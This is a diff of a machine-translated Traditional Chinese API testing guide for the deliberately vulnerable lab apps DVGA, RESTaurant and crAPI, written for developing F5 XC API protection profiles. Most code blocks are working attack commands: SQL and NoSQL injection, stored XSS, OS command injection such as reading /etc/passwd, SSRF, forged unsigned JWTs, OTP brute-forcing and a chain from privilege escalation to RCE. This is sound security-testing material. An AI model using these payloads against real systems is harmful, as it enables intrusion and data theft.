@@ -1,6 +1,6 @@
 ---
 title: API 測試指南
-description: 完整的端點目錄、弱點對應與攻擊酬載，涵蓋 DVGA、RESTaurant 及 crAPI — 用於流量生成與 F5 XC API 防護設定檔開發的入門參考
+description: 完整的端點目錄、弱點對映及攻擊酬載，涵蓋 DVGA、RESTaurant 及 crAPI — 用於流量生成與 F5 XC API 防護設定檔開發的入門參考
 sidebar:
   order: 8
 i18n:
@@ -8,15 +8,15 @@ i18n:
   translator: machine
 ---
 
-## 概述
+## 概覽
 
-本指南彙整了三個 API 安全測試應用程式中的所有 API 端點、刻意設計的弱點及攻擊酬載。可用來建立流量生成模式，以開發 F5 XC API 防護設定檔。
+本指南彙整了三個 API 安全測試應用程式中的每個 API 端點、刻意設計的弱點及攻擊酬載。可用來建構流量生成模式，以開發 F5 XC API 防護設定檔。
 
-| 應用程式 | 協定 | 路徑 | 連接埠 | 驗證 | 弱點 |
+| 應用程式 | 協定 | 路徑 | 連接埠 | 認證 | 弱點 |
 |---|---|---|---|---|---|
-| **DVGA** | GraphQL | `/dvga/` | 80 | 無 (管理者: admin/password) | 25 個場景 |
-| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (表單編碼) | 7 個 OWASP API 2023 類別 |
-| **crAPI** | REST (微服務) | `/` | 8888 | JWT (Bearer) | 18 個以上挑戰 |
+| **DVGA** | GraphQL | `/dvga/` | 80 | 無 (admin: admin/password) | 25 個情境 |
+| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (表單編碼) | 7 個 OWASP API 2023 分類 |
+| **crAPI** | REST (微服務) | `/` | 8888 | JWT (Bearer) | 18+ 個挑戰 |
 
 ### 環境變數
 
@@ -31,9 +31,9 @@ CRAPI="http://<ORIGIN_IP>:8888"
 
 **GraphQL 端點：** `POST ${ORIGIN}/dvga/graphql`
 **GraphiQL IDE：** `GET ${ORIGIN}/dvga/`
-**管理者憑證：** admin / password
+**管理員帳號密碼：** admin / password
 
-所有 DVGA 互動都使用單一端點 (`/dvga/graphql`)，透過 POST 請求傳送 JSON `{"query":"..."}` 酬載。
+所有 DVGA 的互動都透過單一端點（`/dvga/graphql`），使用包含 JSON `{"query":"..."}` 酬載的 POST 請求。
 
 ### Schema 概覽
 
@@ -46,21 +46,21 @@ Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
 
 ### 端點參考
 
-| 操作 | 類型 | 驗證 | 用途 |
+| 操作 | 類型 | 認證 | 用途 |
 |---|---|---|---|
-| `pastes(public, filter, limit)` | Query | 否 | 列出 paste（filter 存在 SQL 注入） |
+| `pastes(public, filter, limit)` | Query | 否 | 列出 paste（可透過 filter 進行 SQL 注入） |
 | `paste(id)` | Query | 否 | 取得單一 paste |
-| `me(token)` | Query | 否 | 以 JWT 取得使用者（可偽造） |
+| `me(token)` | Query | 否 | 透過 JWT 取得使用者（可偽造弱點） |
 | `systemHealth` | Query | 否 | 健康檢查 |
 | `systemUpdate` | Query | 否 | 慢速查詢（約 82 秒，DoS 攻擊向量） |
-| `systemDiagnostics(cmd)` | Query | admin/password | 執行白名單中的作業系統命令 |
-| `createPaste(title, content, public)` | Mutation | 否 | 建立 paste（content 存在 XSS） |
+| `systemDiagnostics(cmd)` | Query | admin/password | 執行白名單內的作業系統指令 |
+| `createPaste(title, content, public)` | Mutation | 否 | 建立 paste（content 可進行 XSS） |
 | `importPaste(host, port, path, scheme)` | Mutation | 否 | 匯入遠端 paste（SSRF、命令注入） |
 | `uploadPaste(filename, content)` | Mutation | 否 | 上傳 paste（路徑穿越） |
 
 ### 弱點目錄
 
-#### 1. 阻斷服務（6 個場景）
+#### 1. 阻斷服務攻擊（6 個情境）
 
 **批次查詢攻擊：**
 ```bash
@@ -69,14 +69,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
 ```
 
-**深度遞迴（循環 Owner/Paste 參照）：**
+**深層遞迴（循環 Owner/Paste 參照）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
 ```
 
-**資源密集型查詢（回應時間約 82 秒）：**
+**資源密集型查詢（約 82 秒回應時間）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -90,14 +90,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
 ```
 
-**別名攻擊（1000 個別名操作）：**
+**基於別名的攻擊（1000 個別名操作）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
 ```
 
-#### 2. 資訊洩漏（5 個場景）
+#### 2. 資訊洩露（5 個情境）
 
 **自省查詢（完整 schema 列舉）：**
 ```bash
@@ -106,60 +106,60 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
 ```
 
-**欄位建議（拼寫錯誤揭露有效欄位）：**
+**欄位建議（拼字錯誤揭露有效欄位）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{titl}}"}'
 ```
 
-**透過 importPaste 的 SSRF（探測內部服務）：**
+**透過 importPaste 進行 SSRF（探測內部服務）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
 ```
 
-#### 3. 注入攻擊（4 個場景）
+#### 3. 注入攻擊（4 個情境）
 
-**透過 filter 參數的 SQL 注入：**
+**透過 filter 參數進行 SQL 注入：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
 ```
 
-**透過 createPaste 的儲存型 XSS：**
+**透過 createPaste 進行儲存型 XSS：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
 ```
 
-**日誌注入（操作名稱偽造）：**
+**日誌注入（操作名稱偽裝）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
 ```
 
-#### 4. 程式碼執行（3 個場景）
+#### 4. 程式碼執行（3 個情境）
 
-**透過 importPaste 的作業系統命令注入：**
+**透過 importPaste 進行作業系統命令注入：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
 ```
 
-**透過 systemDiagnostics 的作業系統命令（需要管理者驗證）：**
+**透過 systemDiagnostics 執行作業系統命令（需要管理員認證）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
 ```
 
-#### 5. 授權繞過（3 個場景）
+#### 5. 授權繞過（3 個情境）
 
 **JWT 權杖偽造（接受未簽署的權杖）：**
 ```bash
@@ -168,7 +168,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
 ```
 
-**透過 uploadPaste 的任意檔案寫入（路徑穿越）：**
+**透過 uploadPaste 進行任意檔案寫入（路徑穿越）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -181,10 +181,10 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 **Swagger UI：** `${ORIGIN}/restaurant/docs`
 **OpenAPI 規格：** `${ORIGIN}/restaurant/openapi.json`
-**驗證：** JWT，透過表單編碼 POST 至 `/restaurant/token`
-**角色：** Customer（預設）、Employee、Chef（管理者）
+**認證：** JWT，透過表單編碼的 POST 請求至 `/restaurant/token`
+**角色：** Customer（預設）、Employee、Chef（管理員）
 
-### 設定：註冊與驗證
+### 設定：註冊與認證
 
 ```bash
 # 註冊測試使用者
@@ -202,35 +202,35 @@ echo "Bearer token: ${TOKEN}"
 
 ### 端點參考
 
-| 端點 | 方法 | 驗證 | 角色 | 弱點 |
+| 端點 | 方法 | 認證 | 角色 | 弱點 |
 |---|---|---|---|---|
 | `/restaurant/register` | POST | 否 | — | 使用者建立 |
-| `/restaurant/token` | POST | 否 | — | JWT 使用弱金鑰 (97952) |
+| `/restaurant/token` | POST | 否 | — | JWT 使用弱密鑰 (97952) |
 | `/restaurant/healthcheck` | GET | 否 | — | 健康檢查 |
-| `/restaurant/profile` | GET | 是 | 任何 | 使用者個人資料 |
-| `/restaurant/profile` | PUT | 是 | 任何 | **BOLA**（修改其他使用者） |
-| `/restaurant/profile` | PATCH | 是 | 任何 | **BOPLA**（批量指派角色） |
-| `/restaurant/users/update_role` | PUT | 是 | 任何 | **BFLA**（角色提升） |
-| `/restaurant/menu` | GET | 是 | 任何 | 列出菜單項目 |
-| `/restaurant/menu` | PUT | 是 | Employee+ | 建立菜單（透過 image 的 **SSRF**） |
-| `/restaurant/menu/{item_id}` | PUT | 是 | Employee+ | 更新菜單（透過 image 的 **SSRF**） |
-| `/restaurant/menu/{item_id}` | DELETE | 是 | 任何 | **BFLA**（任何使用者都可刪除） |
-| `/restaurant/orders` | GET | 是 | 任何 | **BOLA**（檢視所有訂單） |
-| `/restaurant/orders` | POST | 是 | 任何 | 建立訂單 |
-| `/restaurant/orders/{order_id}` | GET | 是 | 任何 | **BOLA**（存取其他訂單） |
-| `/restaurant/orders/status/{order_id}` | GET | 是 | 任何 | 訂單狀態 |
+| `/restaurant/profile` | GET | 是 | 任意 | 使用者個人檔案 |
+| `/restaurant/profile` | PUT | 是 | 任意 | **BOLA**（修改其他使用者） |
+| `/restaurant/profile` | PATCH | 是 | 任意 | **BOPLA**（批量指派角色） |
+| `/restaurant/users/update_role` | PUT | 是 | 任意 | **BFLA**（角色提權） |
+| `/restaurant/menu` | GET | 是 | 任意 | 列出菜單項目 |
+| `/restaurant/menu` | PUT | 是 | Employee+ | 建立菜單（透過圖片進行 **SSRF**） |
+| `/restaurant/menu/{item_id}` | PUT | 是 | Employee+ | 更新菜單（透過圖片進行 **SSRF**） |
+| `/restaurant/menu/{item_id}` | DELETE | 是 | 任意 | **BFLA**（任何使用者都可刪除） |
+| `/restaurant/orders` | GET | 是 | 任意 | **BOLA**（檢視所有訂單） |
+| `/restaurant/orders` | POST | 是 | 任意 | 建立訂單 |
+| `/restaurant/orders/{order_id}` | GET | 是 | 任意 | **BOLA**（存取其他訂單） |
+| `/restaurant/orders/status/{order_id}` | GET | 是 | 任意 | 訂單狀態 |
 | `/restaurant/admin/stats/disk` | GET | 是 | Chef | **命令注入** |
 | `/restaurant/reset-password` | POST | 否 | — | 密碼重設請求 |
 | `/restaurant/reset-password/new-password` | POST | 否 | — | 設定新密碼 |
-| `/restaurant/referral-code` | GET | 是 | 任何 | 取得推薦碼 |
-| `/restaurant/apply-referral` | POST | 是 | 任何 | 套用推薦碼 |
-| `/restaurant/discount-coupons` | GET | 是 | 任何 | 列出優惠券 |
+| `/restaurant/referral-code` | GET | 是 | 任意 | 取得推薦代碼 |
+| `/restaurant/apply-referral` | POST | 是 | 任意 | 套用推薦 |
+| `/restaurant/discount-coupons` | GET | 是 | 任意 | 列出優惠券 |
 
 ### 弱點目錄
 
-#### API1:2023 — 物件層級授權破損 (BOLA)
+#### API1:2023 — 物件層級授權破壞 (BOLA)
 
-**修改其他使用者的個人資料：**
+**修改其他使用者的個人檔案：**
 ```bash
 curl -X PUT ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -247,22 +247,22 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### API2:2023 — 驗證機制破損
+#### API2:2023 — 認證破壞
 
-**JWT 弱金鑰暴力破解（金鑰為 6 位數字：97952）：**
+**JWT 弱密鑰暴力破解（密鑰為 6 位數字：97952）：**
 ```bash
-# 在 jwt.io 解碼與偽造權杖
-# 金鑰：97952（可用 hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' 暴力破解）
+# 在 jwt.io 解碼並偽造權杖
+# 密鑰：97952（可使用 hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' 暴力破解）
 
 # 偽造 Chef 權杖：
 # Header: {"alg":"HS256","typ":"JWT"}
 # Payload: {"sub":"chef","exp":9999999999}
-# 以金鑰 97952 簽署
+# 使用密鑰簽署：97952
 ```
 
-#### API3:2023 — 物件屬性層級授權破損 (BOPLA)
+#### API3:2023 — 物件屬性層級授權破壞 (BOPLA)
 
-**批量指派角色，從 Customer 升級至 Chef：**
+**批量指派角色，從 Customer 提升為 Chef：**
 ```bash
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -285,9 +285,9 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
   -d '{"role":"Chef"}'
 ```
 
-#### API5:2023 — 功能層級授權破損 (BFLA)
+#### API5:2023 — 功能層級授權破壞 (BFLA)
 
-**以 Customer 身分刪除菜單項目（應需 Employee 以上）：**
+**以 Customer 身份刪除菜單項目（應需要 Employee 以上權限）：**
 ```bash
 curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
   -H "Authorization: Bearer ${TOKEN}"
@@ -314,9 +314,9 @@ curl -X PUT ${ORIGIN}/restaurant/menu \
 
 #### API8:2023 — 注入攻擊
 
-**透過磁碟統計的作業系統命令注入（需要 Chef 角色）：**
+**透過磁碟統計資訊進行作業系統命令注入（需要 Chef 角色）：**
 ```bash
-# 提升為 Chef 後：
+# 提升為 Chef 之後：
 curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
   -H "Authorization: Bearer ${TOKEN}"
 
@@ -336,17 +336,17 @@ curl -X POST ${ORIGIN}/restaurant/register \
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
 
-# 3. 提升為 Chef (BOPLA)
+# 3. 提升為 Chef（BOPLA）
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"role":"Chef"}'
 
-# 4. 重新驗證以取得 Chef 層級的權杖
+# 4. 重新認證以取得 Chef 級別的權杖
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
 
-# 5. 命令注入 (RCE)
+# 5. 命令注入（RCE）
 curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
   -H "Authorization: Bearer ${TOKEN}"
 ```
@@ -356,11 +356,11 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
 ## crAPI（OWASP Completely Ridiculous API）
 
 **Web UI：** `${CRAPI}/`
-**MailHog：** `${CRAPI}/mailhog/`（用於驗證的電子郵件擷取）
-**驗證：** JWT Bearer 權杖（RS256，存在演算法混淆弱點）
+**MailHog：** `${CRAPI}/mailhog/`（用於擷取驗證信件）
+**認證：** JWT Bearer 權杖（RS256，存在演算法混淆弱點）
 **架構：** 7 個微服務（identity、community、workshop、postgres、mongo、mailhog、web）
 
-### 設定：註冊、驗證電子郵件、登入
+### 設定：註冊、驗證信箱、登入
 
 ```bash
 # 1. 註冊
@@ -368,8 +368,8 @@ curl -X POST ${CRAPI}/identity/api/auth/signup \
   -H "Content-Type: application/json" \
   -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'
 
-# 2. 檢查 MailHog 中的驗證信件
-# 瀏覽 ${CRAPI}/mailhog/ 或使用 MailHog API：
+# 2. 檢查 MailHog 的驗證信件
+# 瀏覽至 ${CRAPI}/mailhog/ 或使用 MailHog API：
 curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
 import sys,json
 msgs = json.load(sys.stdin)['items']
@@ -387,44 +387,44 @@ echo "Bearer token: ${TOKEN}"
 
 ### 端點參考
 
-#### Identity 服務
+#### 身份認證服務
 
-| 端點 | 方法 | 驗證 | 弱點 |
+| 端點 | 方法 | 認證 | 弱點 |
 |---|---|---|---|
 | `/identity/api/auth/signup` | POST | 否 | 註冊 |
 | `/identity/api/auth/login` | POST | 否 | JWT 權杖（演算法混淆） |
 | `/identity/api/auth/forget-password` | POST | 否 | 請求 OTP |
 | `/identity/api/auth/v2/check-otp` | POST | 否 | **無速率限制**（暴力破解 4 位數 OTP） |
 | `/identity/api/auth/v3/check-otp` | POST | 否 | 有速率限制的版本 |
-| `/identity/api/v2/user/dashboard` | GET | 是 | 使用者個人資料 |
-| `/identity/api/v2/user/change-email` | PUT | 是 | 變更電子郵件 |
-| `/identity/api/v2/vehicle/vehicles` | GET | 是 | 列出車輛（洩漏 UUID） |
+| `/identity/api/v2/user/dashboard` | GET | 是 | 使用者個人檔案 |
+| `/identity/api/v2/user/change-email` | PUT | 是 | 變更信箱 |
+| `/identity/api/v2/vehicle/vehicles` | GET | 是 | 列出車輛（洩露 UUID） |
 | `/identity/api/v2/vehicle/{uuid}/location` | GET | 是 | **BOLA**（任何使用者的車輛） |
 | `/identity/api/v2/user/videos` | POST | 是 | 影片上傳 |
-| `/identity/api/v2/user/videos/{id}` | GET | 是 | **資料洩漏**（conversion_params） |
+| `/identity/api/v2/user/videos/{id}` | GET | 是 | **資料洩露**（conversion_params） |
 | `/identity/api/v2/user/videos/{id}` | PUT | 是 | **批量指派**（命令注入） |
-| `/identity/api/v2/admin/videos/{id}` | DELETE | 是 | **BFLA**（未檢查管理者身分） |
+| `/identity/api/v2/admin/videos/{id}` | DELETE | 是 | **BFLA**（無管理員檢查） |
 
-#### Community 服務
+#### 社群服務
 
-| 端點 | 方法 | 驗證 | 弱點 |
+| 端點 | 方法 | 認證 | 弱點 |
 |---|---|---|---|
-| `/community/api/v2/community/posts` | GET | 是 | **資料洩漏**（洩漏 vehicle_id、email） |
+| `/community/api/v2/community/posts` | GET | 是 | **資料洩露**（洩露 vehicle_id、email） |
 | `/community/api/v2/community/posts` | POST | 是 | 建立部落格文章 |
 | `/community/api/v2/community/posts/{id}/comments` | POST | 是 | 新增留言 |
 | `/community/api/v2/coupon/validate-coupon` | POST | 是 | **NoSQL 注入** |
 
-#### Workshop 服務
+#### 維修服務
 
-| 端點 | 方法 | 驗證 | 弱點 |
+| 端點 | 方法 | 認證 | 弱點 |
 |---|---|---|---|
-| `/workshop/api/mechanic` | GET | 是 | **資料洩漏**（技師電子郵件） |
-| `/workshop/api/mechanic/mechanic_report` | GET | 否 | **BOLA**（無驗證，序號 ID） |
+| `/workshop/api/mechanic` | GET | 是 | **資料洩露**（技師信箱） |
+| `/workshop/api/mechanic/mechanic_report` | GET | 否 | **BOLA**（無認證、循序 ID） |
 | `/workshop/api/merchant/contact_mechanic` | POST | 是 | **SSRF** + **DoS** |
 | `/workshop/api/shop/products` | GET | 是 | 產品目錄 |
 | `/workshop/api/shop/orders/` | POST | 是 | 建立訂單 |
 | `/workshop/api/shop/orders/all` | GET | 是 | 列出訂單 |
-| `/workshop/api/shop/orders/{id}` | GET | 否 | **BOLA**（無需驗證） |
+| `/workshop/api/shop/orders/{id}` | GET | 否 | **BOLA**（不需認證） |
 | `/workshop/api/shop/orders/{id}` | PUT | 是 | **批量指派**（status、quantity） |
 | `/workshop/api/shop/apply_coupon` | POST | 是 | **SQL 注入** |
 
@@ -442,10 +442,10 @@ curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### 挑戰 2 — BOLA：存取技師報告（無需驗證）
+#### 挑戰 2 — BOLA：存取技師報告（無需認證）
 
 ```bash
-# 序號 ID 列舉 — 無需權杖
+# 循序 ID 列舉 — 不需要權杖
 for i in 1 2 3 4 5; do
   echo "Report $i:"
   curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
@@ -453,7 +453,7 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### 挑戰 3 — 驗證機制破損：暴力破解密碼重設 OTP
+#### 挑戰 3 — 認證破壞：暴力破解密碼重設 OTP
 
 ```bash
 # 為受害者請求 OTP
@@ -461,7 +461,7 @@ curl -X POST ${CRAPI}/identity/api/auth/forget-password \
   -H "Content-Type: application/json" \
   -d '{"email":"victim@example.com"}'
 
-# 暴力破解 4 位數 OTP（v2 無速率限制）
+# 暴力破解 4 位數 OTP（v2 版本沒有速率限制）
 for otp in $(seq -w 0000 9999); do
   RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
     -H "Content-Type: application/json" \
@@ -470,23 +470,23 @@ for otp in $(seq -w 0000 9999); do
 done
 ```
 
-#### 挑戰 4 — 資料洩漏：洩漏技師電子郵件
+#### 挑戰 4 — 資料洩露：洩露技師信箱
 
 ```bash
 curl -sf ${CRAPI}/workshop/api/mechanic \
   -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
 ```
 
-#### 挑戰 5 — 資料洩漏：內部影片轉換參數
+#### 挑戰 5 — 資料洩露：內部影片轉換參數
 
 ```bash
-# 上傳影片，然後檢查回應
+# 上傳影片後，檢視回應內容
 curl -sf ${CRAPI}/identity/api/v2/user/videos \
   -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
 # 在回應中尋找 conversion_params 欄位
 ```
 
-#### 挑戰 6 — DoS：透過聯繫技師的第 7 層攻擊
+#### 挑戰 6 — DoS：透過聯絡技師進行第 7 層攻擊
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
@@ -502,25 +502,25 @@ curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
   }'
 ```
 
-#### 挑戰 7 — BFLA：透過管理者端點刪除影片
+#### 挑戰 7 — BFLA：透過管理員端點刪除影片
 
 ```bash
-# 一般使用者可存取管理者端點
+# 一般使用者可存取管理員端點
 curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### 挑戰 8 & 9 — 批量指派：透過訂單操控取得免費商品
+#### 挑戰 8 與 9 — 批量指派：透過訂單操作取得免費商品
 
 ```bash
-# 將 GET 改為 PUT，修改狀態和數量
+# 將 GET 改為 PUT，修改 status 和 quantity
 curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"status":"returned","quantity":100}'
 ```
 
-#### 挑戰 10 — 透過影片轉換參數的命令注入
+#### 挑戰 10 — 透過影片轉換參數進行命令注入
 
 ```bash
 curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
@@ -529,7 +529,7 @@ curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
   -d '{"conversion_params":"-v codec h264; cat /etc/passwd"}'
 ```
 
-#### 挑戰 11 — 透過聯繫技師的 SSRF
+#### 挑戰 11 — 透過聯絡技師進行 SSRF
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
@@ -563,10 +563,10 @@ curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
   -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
 ```
 
-#### 挑戰 14 — 未驗證的訂單存取
+#### 挑戰 14 — 未認證的訂單存取
 
 ```bash
-# 無 Authorization 標頭 — 仍回傳資料
+# 無 Authorization 標頭 — 仍然回傳資料
 for i in 1 2 3 4 5; do
   curl -sf ${CRAPI}/workshop/api/shop/orders/${i}
   echo ""
@@ -577,9 +577,9 @@ done
 
 ```bash
 # 使用 "none" 演算法偽造 JWT（無簽章驗證）：
-# 1. 設定 header: {"alg":"none","typ":"JWT"} 並進行 base64url 編碼
-# 2. 設定 payload: {"email":"admin@example.com","role":"admin"} 並進行 base64url 編碼
-# 3. 以點號連接，簽章留空：<header>.<payload>.
+# 1. 設定 header：{"alg":"none","typ":"JWT"} 並進行 base64url 編碼
+# 2. 設定 payload：{"email":"admin@example.com","role":"admin"} 並進行 base64url 編碼
+# 3. 以點號串接，簽章部分留空：<header>.<payload>.
 HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 FORGED="${HEADER}.${PAYLOAD}."
@@ -590,27 +590,27 @@ curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
 
 ---
 
-## OWASP API 安全十大風險交叉對照
+## OWASP API 安全 Top 10 交叉對照
 
-| OWASP 類別 | DVGA | RESTaurant | crAPI |
+| OWASP 分類 | DVGA | RESTaurant | crAPI |
 |---|---|---|---|
 | **API1: BOLA** | — | `PUT /profile`、`GET /orders/{id}` | 車輛位置、技師報告、訂單 |
-| **API2: 驗證機制破損** | JWT 偽造（`me` 查詢） | JWT 弱金鑰 (97952) | OTP 暴力破解 (v2)、JWT 演算法混淆 |
-| **API3: BOPLA** | — | `PATCH /profile`（角色提升） | 影片 conversion_params、技師電子郵件洩漏 |
+| **API2: 認證破壞** | JWT 偽造（`me` 查詢） | JWT 弱密鑰 (97952) | OTP 暴力破解（v2）、JWT 演算法混淆 |
+| **API3: BOPLA** | — | `PATCH /profile`（角色提權） | 影片 conversion_params、技師信箱洩露 |
 | **API4: 資源消耗** | 批次、遞迴、別名、欄位重複 DoS | 透過回應長度列舉使用者 | `contact_mechanic` repeat_request DoS |
-| **API5: BFLA** | — | `DELETE /menu`、`PUT /users/update_role` | 一般使用者可存取 `DELETE /admin/videos` |
+| **API5: BFLA** | — | `DELETE /menu`、`PUT /users/update_role` | 以一般使用者身份 `DELETE /admin/videos` |
 | **API6: 批量指派** | — | `PUT /orders`（status、quantity） | 訂單 status/quantity、影片 conversion_params |
 | **API7: SSRF** | `importPaste` mutation | `PUT /menu` image_url | `contact_mechanic` mechanic_api URL |
-| **API8: 注入攻擊** | SQL (`filter`)、XSS (`content`)、OS 命令 (`importPaste`、`systemDiagnostics`) | OS 命令 (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`)、SQL (`apply_coupon`) |
-| **API9: 不當的資產管理** | — | — | 已棄用的 `/auth/v2/check-otp`（無速率限制） |
+| **API8: 注入** | SQL（`filter`）、XSS（`content`）、OS cmd（`importPaste`、`systemDiagnostics`） | OS cmd（`/admin/stats/disk?parameters=`） | NoSQL（`validate-coupon`）、SQL（`apply_coupon`） |
+| **API9: 資產管理不當** | — | — | 已棄用的 `/auth/v2/check-otp`（無速率限制） |
 | **API10: 不安全的消費** | — | — | （透過 SSRF 間接觸發） |
-| **GraphQL 特定** | 自省查詢、批次處理、遞迴、別名、欄位重複、循環片段 | — | — |
+| **GraphQL 特定** | 自省、批次、遞迴、別名、欄位重複、循環片段 | — | — |
 
 ---
 
 ## 流量生成模式
 
-### 第 1 階段：基準線（正常路徑）
+### 階段 1：基準線（正常路徑）
 
 在測試攻擊模式之前，先產生合法流量以建立正常的 API 行為基準。
 
@@ -635,33 +635,33 @@ curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
 curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
 ```
 
-### 第 2 階段：依 OWASP 類別的攻擊流量
+### 階段 2：依 OWASP 分類的攻擊流量
 
-**BOLA 測試：** 列舉序號 ID、在請求中替換使用者識別碼、未經授權存取資源。
+**BOLA 測試：** 列舉循序 ID、在請求中交換使用者識別碼、在無所有權的情況下存取資源。
 
-**注入測試：** 在 filter/coupon 參數中使用 SQL 酬載、GraphQL 查詢注入、透過參數欄位進行 OS 命令注入。
+**注入測試：** 在 filter/coupon 參數中使用 SQL 酬載、GraphQL 查詢注入、透過參數欄位進行作業系統命令注入。
 
-**驗證繞過測試：** 偽造 JWT 權杖、暴力破解 OTP、使用已棄用的 API 版本、演算法混淆。
+**認證繞過測試：** 偽造 JWT 權杖、暴力破解 OTP、使用已棄用的 API 版本、演算法混淆。
 
-**SSRF 測試：** 在 `importPaste`、`image_url` 和 `mechanic_api` 參數中使用內部 URL。
+**SSRF 測試：** 在 `importPaste`、`image_url` 及 `mechanic_api` 參數中使用內部 URL。
 
-**DoS 測試：** GraphQL 批次/遞迴/別名攻擊、使用高次數的 `repeat_request_if_failed`。
+**DoS 測試：** GraphQL 批次/遞迴/別名攻擊、`repeat_request_if_failed` 搭配高重複次數。
 
-### 第 3 階段：有狀態的攻擊鏈
+### 階段 3：有狀態的攻擊鏈
 
-部分攻擊需要帶有狀態的多步驟序列：
+某些攻擊需要具有狀態的多步驟序列：
 
-1. **RESTaurant 提權鏈：** 註冊 → 取得權杖 → PATCH 角色為 Chef → 重新驗證 → 命令注入
